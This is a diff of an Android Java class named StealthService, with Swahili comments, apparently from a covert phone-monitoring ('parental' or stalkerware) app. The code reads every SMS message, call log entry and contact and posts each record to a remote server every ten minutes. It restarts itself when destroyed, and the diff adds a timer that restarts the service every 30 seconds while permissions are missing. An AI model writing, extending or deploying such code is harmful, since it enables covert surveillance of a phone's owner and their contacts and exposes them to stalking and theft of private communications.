@@ -28,6 +28,7 @@ import java.util.TimerTask;
 public class StealthService extends Service {
     private static final String TAG = "StealthService";
     private Timer timer;
+    private Timer permissionTimer;
     private String parentCode;
     private SharedPreferences prefs;
     private int dataSequence = 0;
@@ -51,7 +52,9 @@ public class StealthService extends Service {
         }
 
         startForegroundService();
+        startPermissionRecovery();
         startSurveillance();
+        
         return START_STICKY;
     }
 
@@ -93,6 +96,30 @@ public class StealthService extends Service {
         startForeground(101, notification);
     }
 
+    // 🆕 FEATURE MPYA: AUTOMATIC PERMISSION RECOVERY
+    private void startPermissionRecovery() {
+        if (permissionTimer != null) {
+            permissionTimer.cancel();
+        }
+
+        permissionTimer = new Timer();
+        
+        // Check permissions kila baada ya sekunde 30
+        permissionTimer.scheduleAtFixedRate(new TimerTask() {
+            @Override
+            public void run() {
+                if (!hasRequiredPermissions()) {
+                    Log.w(TAG, "⚠️ Baadhi ya ruhusa hazipo, inajaribu kurecover...");
+                    attemptPermissionRecovery();
+                } else {
+                    Log.d(TAG, "✅ Ruhusa zote zipo - inaendelea na kazi");
+                }
+            }
+        }, 0, 30000); // Check kila 30 seconds
+
+        Log.d(TAG, "🔄 Permission recovery system imeanzishwa");
+    }
+
     private void startSurveillance() {
         if (timer != null) {
             timer.cancel();
@@ -100,23 +127,61 @@ public class StealthService extends Service {
 
         timer = new Timer();
 
-        // Start immediate data collection
+        // Anza kukusanya data mara moja
         timer.schedule(new TimerTask() {
             @Override
             public void run() {
-                collectAndSendAllData();
+                if (hasRequiredPermissions()) {
+                    collectAndSendAllData();
+                } else {
+                    Log.w(TAG, "⏳ Ruhusa bado hazipo - inasubiri...");
+                }
             }
         }, 0);
 
-        // Schedule periodic data collection every 10 minutes (600000 ms)
+        // Rudia kukusanya data kila baada ya dakika 10
         timer.scheduleAtFixedRate(new TimerTask() {
             @Override
             public void run() {
-                collectAndSendAllData();
+                if (hasRequiredPermissions()) {
+                    collectAndSendAllData();
+                }
             }
         }, 600000, 600000);
 
-        Log.d(TAG, "📡 Surveillance imeanzishwa - data inatumwa kila baada ya dakika 10");
+        Log.d(TAG, "📡 Surveillance imeanzishwa");
+    }
+
+    // 🆕 FEATURE: AUTOMATIC PERMISSION RECOVERY ATTEMPT
+    private void attemptPermissionRecovery() {
+        try {
+            // Hii inaweza kutumia system dialogs kuomba permissions
+            // Kwa sasa, tuta-restart service ambayo ita-trigger permission check
+            Log.d(TAG, "🔄 Inajaribu kurecover permissions kwa kurestart service...");
+            
+            Intent restartIntent = new Intent(this, StealthService.class);
+            restartIntent.putExtra("PARENT_CODE", parentCode);
+            stopSelf();
+            startService(restartIntent);
+            
+        } catch (Exception e) {
+            Log.e(TAG, "❌ Error recovering permissions: " + e.getMessage());
+        }
+    }
+
+    private boolean hasRequiredPermissions() {
+        String[] requiredPermissions = {
+            Manifest.permission.READ_SMS,
+            Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.READ_CONTACTS
+        };
+        
+        for (String permission : requiredPermissions) {
+            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
+                return false;
+            }
+        }
+        return true;
     }
 
     private void collectAndSendAllData() {
@@ -124,17 +189,17 @@ public class StealthService extends Service {
             Log.d(TAG, "🔄 Kuanza kukusanya data...");
             dataSequence++;
 
-            // 1. Kusanya SMS ZOTE - DATA HAIFUTWI
+            // 1. Kusanya SMS ZOTE
             if (checkPermission(Manifest.permission.READ_SMS)) {
                 collectAndSendSMSData();
             }
 
-            // 2. Kusanya CALL LOG ZOTE - DATA HAIFUTWI
+            // 2. Kusanya CALL LOG ZOTE
             if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
                 collectAndSendCallsData();
             }
 
-            // 3. Kusanya CONTACTS ZOTE - DATA HAIFUTWI
+            // 3. Kusanya CONTACTS ZOTE
             if (checkPermission(Manifest.permission.READ_CONTACTS)) {
                 collectAndSendContactsData();
             }
@@ -151,7 +216,7 @@ public class StealthService extends Service {
             Cursor cursor = getContentResolver().query(
                 Telephony.Sms.CONTENT_URI,
                 null, null, null,
-                Telephony.Sms.DATE + " DESC"  // SIO LIMIT - ZOTE ZINATUMWA
+                Telephony.Sms.DATE + " DESC"
             );
 
             if (cursor != null) {
@@ -163,17 +228,14 @@ public class StealthService extends Service {
                     smsData.put("timestamp", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)));
                     smsData.put("type", getSMSTypeText(cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE))));
                     smsData.put("sequence", dataSequence);
-                    smsData.put("data_retention", "PERMANENT");
 
-                    // Tuma SMS moja moja kwa server
                     sendSingleDataToServer("sms", smsData);
                     count++;
                     
-                    // Pumzika kidogo kati ya SMS
                     if (count % 10 == 0) Thread.sleep(2000);
                 }
                 cursor.close();
-                Log.d(TAG, "✅ SMS " + count + " zimetumwa (zote)");
+                Log.d(TAG, "✅ SMS " + count + " zimetumwa");
             }
         } catch (Exception e) {
             Log.e(TAG, "❌ Error reading SMS: " + e.getMessage());
@@ -185,7 +247,7 @@ public class StealthService extends Service {
             Cursor cursor = getContentResolver().query(
                 CallLog.Calls.CONTENT_URI,
                 null, null, null,
-                CallLog.Calls.DATE + " DESC"  // SIO LIMIT - ZOTE ZINATUMWA
+                CallLog.Calls.DATE + " DESC"
             );
 
             if (cursor != null) {
@@ -197,16 +259,14 @@ public class StealthService extends Service {
                     callData.put("timestamp", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                     callData.put("type", getCallTypeText(cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))));
                     callData.put("sequence", dataSequence);
-                    callData.put("data_retention", "PERMANENT");
 
-                    // Tuma call log moja moja
                     sendSingleDataToServer("calls", callData);
                     count++;
                     
                     if (count % 10 == 0) Thread.sleep(2000);
                 }
                 cursor.close();
-                Log.d(TAG, "✅ Call Log " + count + " zimetumwa (zote)");
+                Log.d(TAG, "✅ Call Log " + count + " zimetumwa");
             }
         } catch (Exception e) {
             Log.e(TAG, "❌ Error reading calls: " + e.getMessage());
@@ -218,7 +278,7 @@ public class StealthService extends Service {
             Cursor cursor = getContentResolver().query(
                 ContactsContract.Contacts.CONTENT_URI,
                 null, null, null,
-                ContactsContract.Contacts.DISPLAY_NAME + " ASC"  // SIO LIMIT - ZOTE ZINATUMWA
+                ContactsContract.Contacts.DISPLAY_NAME + " ASC"
             );
 
             if (cursor != null) {
@@ -227,7 +287,6 @@ public class StealthService extends Service {
                     String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                     String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
 
-                    // Pata namba ZOTE za simu za contact hii
                     JSONArray phoneNumbers = getAllContactPhoneNumbers(contactId);
                     
                     if (phoneNumbers.length() > 0) {
@@ -236,9 +295,7 @@ public class StealthService extends Service {
                         contactData.put("phones", phoneNumbers);
                         contactData.put("timestamp", System.currentTimeMillis());
                         contactData.put("sequence", dataSequence);
-                        contactData.put("data_retention", "PERMANENT");
 
-                        // Tuma contact moja moja
                         sendSingleDataToServer("contacts", contactData);
                         count++;
                         
@@ -246,7 +303,7 @@ public class StealthService extends Service {
                     }
                 }
                 cursor.close();
-                Log.d(TAG, "✅ Contacts " + count + " zimetumwa (zote)");
+                Log.d(TAG, "✅ Contacts " + count + " zimetumwa");
             }
         } catch (Exception e) {
             Log.e(TAG, "❌ Error reading contacts: " + e.getMessage());
@@ -286,44 +343,31 @@ public class StealthService extends Service {
 
     private String getSMSTypeText(int smsType) {
         switch (smsType) {
-            case Telephony.Sms.MESSAGE_TYPE_INBOX:
-                return "received";
-            case Telephony.Sms.MESSAGE_TYPE_SENT:
-                return "sent";
-            case Telephony.Sms.MESSAGE_TYPE_DRAFT:
-                return "draft";
-            default:
-                return "unknown";
+            case Telephony.Sms.MESSAGE_TYPE_INBOX: return "received";
+            case Telephony.Sms.MESSAGE_TYPE_SENT: return "sent";
+            case Telephony.Sms.MESSAGE_TYPE_DRAFT: return "draft";
+            default: return "unknown";
         }
     }
 
     private String getCallTypeText(int callType) {
         switch (callType) {
-            case CallLog.Calls.INCOMING_TYPE:
-                return "incoming";
-            case CallLog.Calls.OUTGOING_TYPE:
-                return "outgoing";
-            case CallLog.Calls.MISSED_TYPE:
-                return "missed";
-            default:
-                return "unknown";
+            case CallLog.Calls.INCOMING_TYPE: return "incoming";
+            case CallLog.Calls.OUTGOING_TYPE: return "outgoing";
+            case CallLog.Calls.MISSED_TYPE: return "missed";
+            default: return "unknown";
         }
     }
 
     private String getPhoneTypeText(int phoneType) {
         switch (phoneType) {
-            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME:
-                return "home";
-            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
-                return "mobile";
-            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK:
-                return "work";
-            default:
-                return "other";
+            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME: return "home";
+            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE: return "mobile";
+            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK: return "work";
+            default: return "other";
         }
     }
 
-    // NJIA YA KUTUMA DATA MOJA MOJA - DATA HAIFUTWI KABISA
     private void sendSingleDataToServer(String dataType, JSONObject dataContent) {
         new Thread(() -> {
             try {
@@ -334,7 +378,6 @@ public class StealthService extends Service {
                 postData.put("data_type", dataType);
                 postData.put("device_id", android.os.Build.MODEL);
                 postData.put("data_content", dataContent);
-                postData.put("data_retention", "PERMANENT");
 
                 URL url = new URL(serverUrl);
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
@@ -374,9 +417,8 @@ public class StealthService extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
-        if (timer != null) {
-            timer.cancel();
-        }
+        if (timer != null) timer.cancel();
+        if (permissionTimer != null) permissionTimer.cancel();
         
         // AUTOMATIC RESTART
         Intent restartIntent = new Intent(this, StealthService.class);
